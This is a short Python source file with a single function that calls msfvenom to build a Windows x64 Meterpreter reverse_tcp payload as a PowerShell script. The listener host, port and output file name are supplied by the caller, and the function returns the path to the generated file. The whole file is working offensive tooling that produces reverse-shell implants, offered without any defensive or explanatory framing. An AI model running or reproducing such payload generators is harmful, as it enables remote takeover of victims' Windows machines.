import os
import subprocess

def generate_windows_meterpreter(srv_host, srv_chan, output_dir="output", filename=None):
    """
    Generate a Windows Meterpreter PowerShell payload (.ps1) using msfvenom.
    Returns the path to the .ps1 file.

    The filename will be exactly what the user provides, without timestamps.
    """
    if not filename:
        raise ValueError("Filename must be provided by the user.")

    # Ensure the filename ends with .ps1
    if not filename.lower().endswith(".ps1"):
        filename += ".ps1"

    os.makedirs(output_dir, exist_ok=True)
    file_path = os.path.join(output_dir, filename)

    payload_command = [
        "msfvenom",
        "-p", "windows/x64/meterpreter/reverse_tcp",
        f"LHOST={srv_host}",
        f"LPORT={srv_chan}",
        "-f", "ps1",
        "-o", file_path
    ]

    try:
        subprocess.run(payload_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Failed to generate Meterpreter payload: {e}")

    return file_path
